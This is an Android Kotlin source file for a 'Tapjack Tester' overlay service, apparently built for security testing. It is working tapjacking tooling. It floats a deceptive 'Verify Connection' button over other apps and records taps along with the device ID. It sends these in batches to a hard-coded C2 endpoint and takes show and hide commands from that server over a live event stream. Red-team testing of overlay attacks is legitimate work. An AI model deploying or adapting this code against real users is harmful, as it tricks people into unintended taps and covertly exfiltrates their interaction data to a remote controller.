package ambank.gtr.tapjacktester

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.FrameLayout
import android.widget.Toast
import androidx.core.app.NotificationCompat
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class OverlayService : Service() {

    private lateinit var wm: WindowManager
    private var overlayView: FrameLayout? = null
    private var visualMaskElement: Button? = null // Declare at class level
    private var overlayVisible = false

    // Batching & Network components
    private val tapQueue = LinkedBlockingQueue<TapEvent>()
    private val c2Executor = Executors.newSingleThreadExecutor()
    private val batchScheduler = Executors.newScheduledThreadPool(1)
    private val C2_ENDPOINT = "http://192.168.1.165:3000/tj/report-taps"
    private val SSE_ENDPOINT = "http://192.168.1.165:3000/tj/stream"
    private var deviceId: String = ""

    // Data class without hit count
    data class TapEvent(
        val x: Int,
        val y: Int,
        val timestamp: Long,
        val is_jacked: Boolean,
        val element_text: String
    )

    override fun onCreate() {
        super.onCreate()
        wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
        startForeground(NOTIF_ID, buildNotification())
        createOverlay()

        // Start real-time SSE listener for remote C2 commands
        startSseListener()

        // Schedule batch transmission every 2 seconds
        batchScheduler.scheduleAtFixedRate({
            sendBatchToC2()
        }, 2, 2, TimeUnit.SECONDS)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_SHOW -> showOverlay()
            ACTION_HIDE -> hideOverlay()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        overlayView?.let {
            try { wm.removeView(it) } catch (_: Throwable) {}
        }
        sendBatchToC2()
        batchScheduler.shutdownNow()
        c2Executor.shutdownNow()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createOverlay() {
        val elementWidth = 500
        val elementHeight = 180
        val offsetX = 0
        val offsetY = 400

        // 1. Root container matched to the button size
        val overlay = FrameLayout(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
            visibility = FrameLayout.GONE
        }

        // 2. The visual jacker button
        val visualMaskElement = Button(this).apply {
            text = "Verify Connection"
            setBackgroundColor(Color.parseColor("#E6C23350"))
            setTextColor(Color.BLACK)
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        }

        // 3. Touch listener directly on the button
        visualMaskElement.setOnTouchListener { _, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val rawX = event.rawX.toInt()
                val rawY = event.rawY.toInt()
                val timestamp = System.currentTimeMillis()

                Toast.makeText(
                    applicationContext,
                    "🎯 JACKPOT! Button Hit Captured",
                    Toast.LENGTH_SHORT
                ).show()

                visualMaskElement.text = "HIT VERIFIED"
                visualMaskElement.setBackgroundColor(Color.parseColor("#FF3300"))

                // Enqueue successful jacker hit
                tapQueue.offer(TapEvent(rawX, rawY, timestamp, true, visualMaskElement.text.toString()))
            }
            false
        }

        overlay.addView(visualMaskElement)

        // 4. Window layout params sized specifically to the button widget
        val params = WindowManager.LayoutParams(
            elementWidth,
            elementHeight,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.CENTER
            x = offsetX
            y = offsetY
        }

        wm.addView(overlay, params)
        overlayView = overlay
    }

    private fun showOverlay() {
        overlayVisible = true
        overlayView?.visibility = FrameLayout.VISIBLE
    }

    private fun hideOverlay() {
        overlayVisible = false
        overlayView?.visibility = FrameLayout.GONE
    }

    private fun startSseListener() {
        c2Executor.execute {
            while (!Thread.currentThread().isInterrupted) {
                var connection: HttpURLConnection? = null
                try {
                    val url = URL(SSE_ENDPOINT)
                    connection = url.openConnection() as HttpURLConnection
                    connection.requestMethod = "GET"
                    connection.setRequestProperty("Accept", "text/event-stream")
                    connection.connectTimeout = 15000
                    connection.readTimeout = 0

                    val reader = java.io.BufferedReader(java.io.InputStreamReader(connection.inputStream))
                    var line: String?

                    while (reader.readLine().also { line = it } != null) {
                        if (line!!.startsWith("data: ")) {
                            val command = line!!.substring(6).trim()
                            android.os.Handler(mainLooper).post {
                                when (command) {
                                    "show" -> showOverlay()
                                    "hide" -> hideOverlay()
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    try {
                        Thread.sleep(5000)
                    } catch (_: InterruptedException) {
                        break
                    }
                } finally {
                    connection?.disconnect()
                }
            }
        }
    }

    private fun buildNotification(): Notification {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            nm.createNotificationChannel(
                NotificationChannel(
                    CHANNEL_ID,
                    "Tapjack Tester",
                    NotificationManager.IMPORTANCE_LOW
                )
            )
        }

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("Tapjack Tester running")
            .setContentText("Targeted overlay active")
            .setOngoing(true)
            .build()
    }

    private fun sendBatchToC2() {
        val batch = mutableListOf<TapEvent>()
        tapQueue.drainTo(batch)
        if (batch.isEmpty()) return

        CoroutineScope(Dispatchers.IO).launch {
            var connection: HttpURLConnection? = null
            try {
                Log.d("C2Client", "Sending batch of ${batch.size} taps to $C2_ENDPOINT...")
                val url = URL(C2_ENDPOINT)
                connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doInput = true
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                connection.connectTimeout = 5000
                connection.readTimeout = 5000

                val tapsArray = org.json.JSONArray()
                for (tap in batch) {
                    tapsArray.put(org.json.JSONObject().apply {
                        put("x", tap.x)
                        put("y", tap.y)
                        put("ts", tap.timestamp)
                        put("is_jacked", tap.is_jacked)
                        put("element_text", tap.element_text)
                    })
                }

                val payload = org.json.JSONObject().apply {
                    put("device_id", deviceId)
                    put("taps", tapsArray)
                }.toString()

                val payloadBytes = payload.toByteArray(Charsets.UTF_8)
                connection.setRequestProperty("Content-Length", payloadBytes.size.toString())

                connection.outputStream.use { os ->
                    os.write(payloadBytes)
                    os.flush()
                }

                val code = connection.responseCode
                Log.d("C2Client", "POST Success! Server HTTP Response Code: $code")
            } catch (e: Exception) {
                Log.e("C2Client", "POST Failed with Exception: ${e.message}", e)
            } finally {
                connection?.disconnect()
            }
        }
    }

    companion object {
        const val ACTION_SHOW = "overlay_show"
        const val ACTION_HIDE = "overlay_hide"
        private const val CHANNEL_ID = "tapjacktester"
        private const val NOTIF_ID = 1001
    }
}